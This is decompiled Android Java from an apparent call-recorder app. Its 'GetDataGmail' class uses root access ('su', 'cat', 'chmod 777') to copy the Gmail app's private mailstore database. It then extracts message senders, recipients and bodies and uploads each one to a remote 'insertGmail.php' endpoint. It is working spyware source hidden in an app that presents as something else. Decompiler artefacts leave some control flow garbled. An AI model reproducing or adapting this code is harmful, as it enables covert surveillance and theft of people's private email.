package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.f.a;
import android.content.Context;
import android.database.Cursor;
import com.app.activity.MyApp;
import com.crashlytics.android.Crashlytics;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.zip.InflaterInputStream;

/* compiled from: GetDataGmail */
public class c extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f159b;

    /* renamed from: a reason: collision with root package name */
    private final Context f160a;

    public c(Context context) {
        this.f160a = context;
    }

    /* JADX WARNING: Removed duplicated region for block: B:59:0x019a A[Catch:{ Exception -> 0x01a3 }, LOOP:2: B:56:0x0194->B:59:0x019a, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:87:0x01f9  */
    /* JADX WARNING: Removed duplicated region for block: B:93:0x019e A[EDGE_INSN: B:93:0x019e->B:60:0x019e ?: BREAK  
EDGE_INSN: B:93:0x019e->B:60:0x019e ?: BREAK  
EDGE_INSN: B:93:0x019e->B:60:0x019e ?: BREAK  , SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:93:0x019e A[EDGE_INSN: B:93:0x019e->B:60:0x019e ?: BREAK  
EDGE_INSN: B:93:0x019e->B:60:0x019e ?: BREAK  , SYNTHETIC] */
    private void a(Context context, String str, long j) throws Exception {
        long j2;
        String str2;
        String str3;
        String str4;
        long j3;
        StringBuilder sb;
        StringBuilder sb2;
        File file;
        File file2;
        StringBuilder sb3;
        BufferedReader bufferedReader;
        StringBuilder sb4;
        String readLine;
        Context context2 = context;
        String str5 = "/data/data/";
        String str6 = "";
        String str7 = "\"";
        SimpleDateFormat d2 = a.c.j.c.d();
        StringBuilder sb5 = new StringBuilder();
        a aVar = new a(context2, a.c.e.c.a(), str);
        aVar.b();
        long j4 = j;
        Cursor c2 = aVar.c("messages", j4);
        if (c2 == null) {
            return;
        }
        if (c2.getCount() <= 0) {
            a(aVar, c2);
            return;
        }
        StringBuilder sb6 = sb5;
        long j5 = j4;
        while (c2.moveToNext()) {
            try {
                long j6 = c2.getLong(c2.getColumnIndexOrThrow("dateSentMs"));
                Date date = new Date();
                date.setTime(j6);
                Date date2 = new Date();
                long j7 = j6;
                date2.setTime(e.o(context));
                Calendar instance = Calendar.getInstance();
                instance.setTime(date2);
                instance.add(13, 1);
                if (date.compareTo(instance.getTime()) > 0) {
                    String string = c2.getString(c2.getColumnIndexOrThrow("toAddresses"));
                    String string2 = c2.getString(c2.getColumnIndexOrThrow("fromAddress"));
                    try {
                        string = string.replace(str7, str6);
                    } catch (Exception e2) {
                        e2.getStackTrace();
                    }
                    try {
                        str4 = string2.replace(str7, str6);
                    } catch (Exception e3) {
                        e3.getStackTrace();
                        str4 = string2;
                    }
                    byte[] blob = c2.getBlob(c2.getColumnIndexOrThrow("bodyCompressed"));
                    String string3 = c2.getString(c2.getColumnIndexOrThrow("body"));
                    if (string3 != null) {
                        sb6.append(string3);
                        sb = sb6;
                        j3 = j5;
                        str3 = str5;
                    } else {
                        if (context2.getExternalFilesDir(null) != null) {
                            sb2 = sb6;
                            j3 = j5;
                            file2 = new File(context2.getExternalFilesDir(null).getPath(), ".text");
                            file = new File(context2.getExternalFilesDir(null).getPath(), ".textCompress");
                        } else {
                            sb2 = sb6;
                            j3 = j5;
                            StringBuilder sb7 = new StringBuilder();
                            sb7.append(str5);
                            sb7.append(MyApp.b().getApplicationContext().getPackageName());
                            sb7.append("/.text");
                            file2 = new File(sb7.toString());
                            StringBuilder sb8 = new StringBuilder();
                            sb8.append(str5);
                            sb8.append(MyApp.b().getApplicationContext().getPackageName());
                            sb8.append("/.textCompress");
                            file = new File(sb8.toString());
                        }
                        try {
                            FileOutputStream fileOutputStream = new FileOutputStream(file.getAbsolutePath());
                            fileOutputStream.write(blob);
                            fileOutputStream.close();
                        } catch (Exception e4) {
                            e4.getStackTrace();
                        }
                        try {
                            InflaterInputStream inflaterInputStream = new InflaterInputStream(new FileInputStream(file));
                            FileOutputStream fileOutputStream2 = new FileOutputStream(file2);
                            byte[] bArr = new byte[1000];
                            while (true) {
                                int read = inflaterInputStream.read(bArr);
                                if (read <= 0) {
                                    break;
                                }
                                str3 = str5;
                                try {
                                    fileOutputStream2.write(bArr, 0, read);
                                    str5 = str3;
                                } catch (Exception e5) {
                                    e = e5;
                                    e.getStackTrace();
                                    bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(file2)));
                                    sb4 = new StringBuilder();
                                    while (true) {
                                        try {
                                            readLine = bufferedReader.readLine();
                                            if (readLine == null) {
                                            }
                                            sb4.append(readLine);
                                        } catch (Exception e6) {
                                            e = e6;
                                            sb3 = sb4;
                                            try {
                                                e.getStackTrace();
                                                sb = sb3;
                                                long j8 = j7;
                                                str2 = str6;
                                                j2 = j3;
                                                a(context, string, sb.toString(), str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertGmail.php");
                                                sb6 = sb;
                                                j5 = j8;
                                                str5 = str3;
                                                str6 = str2;
                                            } catch (Exception e7) {
                                                e = e7;
                                                j2 = j3;
                                                e.getStackTrace();
                                                try {
                                                    e.getStackTrace();
                                                    Crashlytics.logException(e);
                                                } catch (Exception unused) {
                                                }
                                                if (j2 != 0) {
                                                }
                                                a(aVar, c2);
                                            }
                                        }
                                    }
                                    bufferedReader.close();
                                    sb = sb4;
                                    long j82 = j7;
                                    str2 = str6;
                                    j2 = j3;
                                    a(context, string, sb.toString(), str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertGmail.php");
                                    sb6 = sb;
                                    j5 = j82;
                                    str5 = str3;
                                    str6 = str2;
                                }
                            }
                            str3 = str5;
                            inflaterInputStream.close();
                            fileOutputStream2.close();
                        } catch (Exception e8) {
                            e = e8;
                            str3 = str5;
                            e.getStackTrace();
                            bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(file2)));
                            sb4 = new StringBuilder();
                            while (true) {
                                readLine = bufferedReader.readLine();
                                if (readLine == null) {
                                }
                                sb4.append(readLine);
                            }
                            bufferedReader.close();
                            sb = sb4;
                            long j822 = j7;
                            str2 = str6;
                            j2 = j3;
                            a(context, string, sb.toString(), str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertGmail.php");
                            sb6 = sb;
                            j5 = j822;
                            str5 = str3;
                            str6 = str2;
                        }
                        try {
                            bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(file2)));
                            sb4 = new StringBuilder();
                            while (true) {
                                readLine = bufferedReader.readLine();
                                if (readLine == null) {
                                    break;
                                }
                                sb4.append(readLine);
                            }
                            bufferedReader.close();
                            sb = sb4;
                        } catch (Exception e9) {
                            e = e9;
                            sb3 = sb2;
                            e.getStackTrace();
                            sb = sb3;
                            long j8222 = j7;
                            str2 = str6;
                            j2 = j3;
                            a(context, string, sb.toString(), str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertGmail.php");
                            sb6 = sb;
                            j5 = j8222;
                            str5 = str3;
                            str6 = str2;
                        }
                    }
                    long j82222 = j7;
                    str2 = str6;
                    j2 = j3;
                    try {
                        a(context, string, sb.toString(), str4, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertGmail.php");
                        sb6 = sb;
                        j5 = j82222;
                    } catch (Exception e10) {
                        e = e10;
                        e.getStackTrace();
                        e.getStackTrace();
                        Crashlytics.logException(e);
                        if (j2 != 0) {
                        }
                        a(aVar, c2);
                    }
                } else {
                    StringBuilder sb9 = sb6;
                    str3 = str5;
                    str2 = str6;
                    long j9 = j5;
                }
                str5 = str3;
                str6 = str2;
            } catch (Exception e11) {
                e = e11;
                j2 = j5;
                e.getStackTrace();
                e.getStackTrace();
                Crashlytics.logException(e);
                if (j2 != 0) {
                }
                a(aVar, c2);
            }
        }
        j2 = j5;
        if (j2 != 0) {
            a.b.a.a.a.a(context2.getSharedPreferences("user", 0), "timegmail", j2);
        }
        a(aVar, c2);
    }

    public void run() {
        String str = "\n";
        String str2 = " > ";
        String str3 = "/data/data/com.google.android.gm/databases/";
        String str4 = "cat ";
        String str5 = "mailstore.";
        try {
            Thread.sleep(8000);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f159b) {
            a(this.f160a);
            return;
        }
        f159b = true;
        try {
            if (e.o(this.f160a) == 0) {
                a.c.e.c.d(this.f160a);
            }
            if (e.o(this.f160a) != 0) {
                long o = e.o(this.f160a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append(str5);
                sb.append(a.c.e.c.a(this.f160a));
                sb.append(".db");
                String sb2 = sb.toString();
                StringBuilder sb3 = new StringBuilder();
                sb3.append(str5);
                sb3.append(a.c.e.c.a(this.f160a));
                sb3.append(".db-shm");
                String sb4 = sb3.toString();
                StringBuilder sb5 = new StringBuilder();
                sb5.append(str5);
                sb5.append(a.c.e.c.a(this.f160a));
                sb5.append(".db-wal");
                String sb6 = sb5.toString();
                StringBuilder sb7 = new StringBuilder();
                sb7.append(str4);
                sb7.append(str3);
                sb7.append(sb2);
                sb7.append(str2);
                sb7.append(a.c.e.c.a());
                sb7.append(sb2);
                sb7.append(" \n");
                dataOutputStream.writeBytes(sb7.toString());
                StringBuilder sb8 = new StringBuilder();
                sb8.append(str4);
                sb8.append(str3);
                sb8.append(sb4);
                sb8.append(str2);
                sb8.append(a.c.e.c.a());
                sb8.append(sb4);
                sb8.append(str);
                dataOutputStream.writeBytes(sb8.toString());
                StringBuilder sb9 = new StringBuilder();
                sb9.append(str4);
                sb9.append(str3);
                sb9.append(sb6);
                sb9.append(str2);
                sb9.append(a.c.e.c.a());
                sb9.append(sb6);
                sb9.append(str);
                dataOutputStream.writeBytes(sb9.toString());
                StringBuilder sb10 = new StringBuilder();
                sb10.append("chmod 777 ");
                sb10.append(a.c.e.c.a());
                sb10.append("* \n");
                dataOutputStream.writeBytes(sb10.toString());
                StringBuilder sb11 = new StringBuilder();
                sb11.append("chmod -R 777 ");
                sb11.append(a.c.e.c.a());
                sb11.append(str);
                dataOutputStream.writeBytes(sb11.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a.c.e.c.a(this.f160a, sb2);
                a(this.f160a, sb2, o);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f159b = false;
        a(this.f160a);
    }
}
